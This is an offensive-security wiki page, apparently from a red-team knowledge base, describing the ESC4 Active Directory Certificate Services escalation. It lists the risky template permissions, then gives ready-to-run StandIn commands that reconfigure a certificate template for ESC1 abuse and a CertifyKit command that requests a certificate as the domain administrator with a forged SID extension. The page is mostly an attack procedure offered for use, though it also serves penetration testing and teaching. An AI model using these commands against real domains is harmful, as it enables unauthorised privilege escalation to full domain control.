---
description: Domain escalation via misconfigured certificate template access control
---

# 4️⃣ ESC4

ESC4 is relatively unique in its exploitation, utilizing mainly Active Directory ACL permissions.

This misconfiguration can occur when unintended users are granted one of the following template security permissions:

* Owner
* FullControl
* WriteOwnerPrincipals
* WriteDaclPrincipals
* WritePropertyPrincipals

Then such a user can modify the target template to configure the specific conditions for an ESC1 attack, then request a certificate as the Domain Administrator.

#### Adding Certificates with StandIn

To add certificates using StandIn, follow these examples:

*   **Certificate Enrollment Permission**: To allow Domain Users to enroll for certificates, use the following command:

    {% code fullWidth="true" %}
    ```powershell
    StandIn_v13_Net45.exe --ADCS --filter SecureUpdate ntaccount "cb domain users" --enroll --add
    ```
    {% endcode %}
*   **Client Authentication EKU**: To add a certificate with Client Authentication EKU, execute:

    ```powershell
    StandIn_v13_Net45.exe --ADCS --filter SecureUpdate --clientauth --add
    ```

ENROLLEE\_SUPPLIES\_SUBJECT:

```
StandIn_v13_Net45.exe --ADCS --filter SecureUpdate --ess --add
```

An example for SmartCardLogon ESC4 Abuse using CertifyKit’s /alter option is as follows:

{% code fullWidth="true" %}
```
CertifyKit.exe request /ca:cb-ca.cb.corp\CB-CA /template:'SecureUpdate' /altname:administrator
/domain:cb.corp /alter /sidextension:S-1-5-21-2928296033-1822922359-262865665-500
```
{% endcode %}
